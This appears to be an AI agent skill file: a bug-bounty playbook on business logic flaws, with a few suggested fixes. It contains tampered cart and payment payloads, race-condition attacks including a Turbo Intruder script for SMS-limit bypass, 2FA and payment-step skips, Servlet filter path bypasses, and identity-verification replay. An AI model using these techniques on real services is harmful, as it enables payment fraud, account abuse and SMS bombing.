---
name: business-logic-vulnerabilities
description: >-
  Business logic vulnerability playbook. Use when reasoning about workflows, race conditions, price manipulation, coupon abuse, state machines, and multi-step authorization gaps.
---

# SKILL: Business Logic Vulnerabilities — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Business logic flaws are scanner-invisible and high-reward on bug bounty. This skill covers race conditions, price manipulation, workflow bypass, coupon/referral abuse, negative values, and state machine attacks. These require human reasoning, not automation. For specific exploitation techniques (payment precision/overflow, captcha bypass, password reset flaws, user enumeration), load the companion [SCENARIOS.md](./SCENARIOS.md). For the workflow approach itself (modeling → state machine → attack-surface matrix → human judgement) load [METHODOLOGY.md](./METHODOLOGY.md). For the per-module check items load [CHECKLIST.md](./CHECKLIST.md).

### Companion files

| File | When to load |
|---|---|
| [METHODOLOGY.md](./METHODOLOGY.md) | Need the 5-phase workflow, attack-surface 5×N matrix, human-judgement decision tree |
| [CHECKLIST.md](./CHECKLIST.md) | Going through a target module-by-module (login / register / payment / IDOR / privacy) and want every line item with why+verify |
| [SCENARIOS.md](./SCENARIOS.md) | Drilling deeper into payment precision/overflow, captcha bypass, password reset, enumeration, frontend bypass |

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- Payment precision & integer overflow attacks — 32-bit overflow to negative, decimal rounding exploitation, negative shipping fees
- Payment parameter tampering checklist — price, discount, currency, gateway, return_url fields
- Condition race practical patterns — parallel coupon application, gift card double-spend with Burp group send
- Captcha bypass techniques — drop verification request, remove parameter, clear cookies to reset counter, OCR with tesseract
- Arbitrary password reset — predictable tokens (`md5(username)`), session replacement attack, registration overwrite
- User information enumeration — login error message difference, masked data reconstruction across endpoints, base64 uid cookie manipulation
- Frontend restriction bypass — array parameters for multiple coupons (`couponid[0]`/`couponid[1]`), remove `disabled`/`readonly` attributes
- Application-layer DoS patterns — regex backtracking, WebSocket abuse

---

## 1. PRICE AND VALUE MANIPULATION

### Negative Quantity / Price
Many applications validate "amount > 0" but not for currency:
```
Add to cart with quantity: -1
Update quantity to: -100
{
  "quantity": -5,
  "price": -99.99     ← may be accepted
}
```
**Impact**: Receive credit to account, items for free, bank transfers in reverse.

### Decimal Quantity — "0元购" Case
Real instructor-led case: an e-commerce app accepted **fractional `quantity`** because backend trusted client float values:
```json
// Cart item:
{"id": 114016, "skuQty": 0.02}
// Original price ¥500 → final price ¥10
// Variant on a food delivery app:
// FoodNum=0.01 → 68元 商品 实付 0.68元
```
Why it works: server multiplies `unit_price * quantity` without enforcing `quantity ∈ Z+`, so a 2% sliver order pays 2% price but ships the full item. Reproduce by intercepting the cart submit → setting `skuQty` / `FoodNum` to `0.02` → finishing checkout.

### Drop a Required Field — Free Tier Coercion
Sport activity registration: when paid prizes are involved server returns `"payType": "paid"`; if the client request is **edited to omit `prizeIdList` entirely**, the server falls back to `"payType": "free"` and creates a successful registration that should have cost money.
```json
// Original
{"prizeIdList": ["6264e6948fe587000113e2d9"], ...}
// Modified — array removed entirely
{"prizeIdList": [], ...}
// Server response:
{"ok": true, "payType": "free"}
```
This is a parameter-existence trust bug — backend treats "field absent" as "no paid item to enforce", so fix is to require the field and validate its content server-side.

### Integer Overflow
```
quantity: 2147483648   ← INT_MAX + 1 overflows to negative in 32-bit
price: 9999999999999   ← exceeds float precision → rounds to 0
```
Real case: setting `amount=999999999` triggered an overflow path where the system stored `0` as final payable. **Always coordinate before triggering overflow tests** — they sometimes crash payment services.

### Rounding Manipulation
```
Item price: $0.001
Order 1000 items → each rounds down → total = $0.00
```
Real "half-price recharge" bug: input `¥0.019` to top-up. The pay gateway charges only `¥0.01` (rounded down to the cent), but the wallet credits `¥0.02` (rounded up). Net gain per cycle is `¥0.01`, repeat for free balance growth.

### Currency Exchange Rate Lag
```
1. Deposit using currency A at rate X
2. Rate changes
3. Withdraw using currency A at new rate → profit from rate difference
```

### Free Upgrade via Promo Stacking
Test combining discount codes, referral credits, welcome bonuses:
```
Apply promo: FREE50  → 50% off
Apply promo: REFER10 → additional 10%
Apply loyalty points → additional discount
Total: -$5 (free + credit)
```

---

## 2. RACE CONDITIONS

**Concept**: Two operations run simultaneously before the first completes its check-update cycle.

### Double-Spend / Double-Redeem
```bash
# Send same request simultaneously (~millisecond apart):
# Use Burp Repeater "Send to Group" or Race Conditions tool:

POST /api/use-coupon    ← send 20 parallel requests
POST /api/redeem-gift   ← same coupon code, parallel
POST /api/withdraw-funds ← same balance, parallel

# If check and update are non-atomic:
# Thread 1: check(balance >= 100) → TRUE
# Thread 2: check(balance >= 100) → TRUE (before Thread 1 deducted)
# Thread 1: balance -= 100
# Thread 2: balance -= 100 → BOTH succeed → double-spend
```

### Race Condition Test with Burp Suite
```
1. Capture request
2. Send to Repeater → duplicate 20+ times
3. "Send group in parallel" (Burp 2023+)
4. Check: did any duplicate succeed?
```

### Turbo Intruder — Bypassing Per-Number SMS Rate Limit
Real case: when a normal request returns `"该号码短时间内申请发送短信次数过多，拒绝发送"`, sending the **same payload** with high concurrency through Turbo Intruder defeats the simple counter:
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=10,
                           pipeline=False)
    for i in range(30):
        engine.queue(target.req, target.baseInput, gate='race1')
    engine.openGate('race1')
```
Result: the per-phone limiter races and many requests slip through, generating multiple distinct verification codes (a real SMS-bombing case). Root cause: counter increment is non-atomic vs. the read.

### Multi-Device Concurrent VIP Subscription
Real case: a service offers **first-month-only discount**. Open the pay sheet on multiple devices (A, B, C) before any payment finishes, then complete each in sequence. Server only checks "is new user?" at the **first** request, so all subsequent requests inherit the discount AND the VIP duration stacks.
```
Normal: 下单 → 支付 → 充值会员 → 第二次下单 → 服务端校验 "已是新人" → 拒绝
Bypass: 设备A: 进入支付页 (锁定优惠资格)
        设备B: 进入支付页 (并发锁定)
        设备A: 完成支付 → VIP +1月 (优惠价)
        设备B: 完成支付 → VIP +1月 (仍按优惠价)
```
Same trick works on "补差价升级会员" — concurrent top-ups duplicate the duration credit.

### Account Registration Race
```
Register with same email simultaneously → two accounts created → data isolation broken
Password reset token race → reuse same token twice
Email verification race → verify multiple email addresses
```

### Limit Bypass via Race
```
"Claim once" discounts, freebies, "first order" bonus:
→ Send 10 parallel POST /claim requests
→ Race window: all pass the "already claimed?" check before any write
```

---

## 3. WORKFLOW / STEP SKIP BYPASS

### Payment Flow Bypass
```
Normal flow:
  1. Add to cart
  2. Enter shipping info
  3. Enter payment (card/wallet)
  4. Click confirm → payment charged
  5. Order confirmed

Attack: Skip to step 5 directly
POST /api/orders/confirm {"cart_id": "1234", "payment_status": "paid"}
→ Does server trust client-sent payment_status?
```

### Multi-Step Verification Skip
```
Password reset flow:
  1. Enter email
  2. Receive token
  3. Enter token
  4. Set new password (requires valid token from step 3)

Attack: Try going to step 4 without completing step 3:
POST /reset/password {"email": "<EMAIL-REDACTED>", "token": "invalid", "new_pass": "hacked"}
→ Does server check that token was properly validated?

Or: Try token from old/expired flow → still accepted?
```

### 2FA Bypass
```
Normal flow:
  1. Enter username + password → success
  2. Enter 2FA code → logged in

Attack: After step 1 success, go directly to /dashboard
→ Is session created before 2FA completes?
→ Does /dashboard require 2FA-complete check or just "authenticated" flag?
```

### Filter Path Truncation Bypass — `..//` and `;`

Real case from a Java Web class audit: a manually-implemented Servlet `Filter` checks login by inspecting the URI string. Two reliable bypasses:

```
Path-traversal truncation (../):
  Protected:   http://target/FilterDemo/index.jsp        → 302 to /login
  Bypass:      http://target/FilterDemo/../../index.jsp  → 200 (filter sees "../../", URL parser collapses)

Semicolon truncation (;):
  Protected:   http://target/admin/doLogin.action        → 302 to /login
  Bypass:      http://target/;/admin/doLogin.action      → 200
                              ^
                              Servlet container treats segment after ; as "path parameter",
                              filter that uses request.getRequestURI() sees "/;/admin/doLogin.action",
                              doesn't match its protected-prefix "/admin/", lets the request through,
                              but the dispatcher then routes to the real /admin/doLogin.action handler.
```

**Fix**: never use `request.getRequestURI()` for security checks; use `request.getServletPath()` which is the normalized servlet-mapped path:
```java
// Vulnerable
String uri = request.getRequestURI();   // /;/admin/doLogin.action
// Safe
String path = request.getServletPath(); // /admin/doLogin.action
```

When auditing Java code, grep for `request.getRequestURI()` paired with `Filter`/`startsWith`/`indexOf("/admin")` patterns — those are immediate red flags.

### Real-Name Verification Replay-To-Reset

Fraudulent path that deliberately fails real-name authentication to **reopen** the editing flow:
```
1. Submit real-name auth with intentionally wrong cardNumber
   → server returns "code:200, msg:success, ok:true" but flow shows "驳回 / 等待审核"
2. Because the server marks state as "rejected" but doesn't lock the user, the UI lets the
   account go back into the "edit identity" state
3. Now resubmit with another (possibly stolen) identity
   → real-name binding repeats indefinitely, defeating anti-addiction lock and enabling account resale
```
Defense: rejected real-name submissions must lock the account / require human review, not loop back to the editor.

### Shipping Without Payment
```
  1. Add item to cart
  2. Enter shipping address
  3. Select payment method (credit card)
  4. Apply promo code (100% discount or gift card)  
  5. Final amount: $0
  6. Order placed

Attack: Apply 100% discount code → no actual payment processed → item ships
```

---


## 全文导航（已拆分）

主卡保留前 3 节；其余 8 节在 `references/full.md`：

- 4. COUPON AND REFERRAL ABUSE
- 5. ACCOUNT / PRIVILEGE LOGIC FLAWS
- 6. API BUSINESS LOGIC FLAWS
- 7. SUBSCRIPTION / TIER CONFUSION
- 8. FILE UPLOAD BUSINESS LOGIC
- 9. TESTING APPROACH
- 10. HIGH-IMPACT CHECKLISTS
- 11. CONSOLIDATED CHECKLIST (2-Hour Full Sweep)

加载：`skill_view(name='business-logic-vulnerabilities', file_path='references/full.md')`
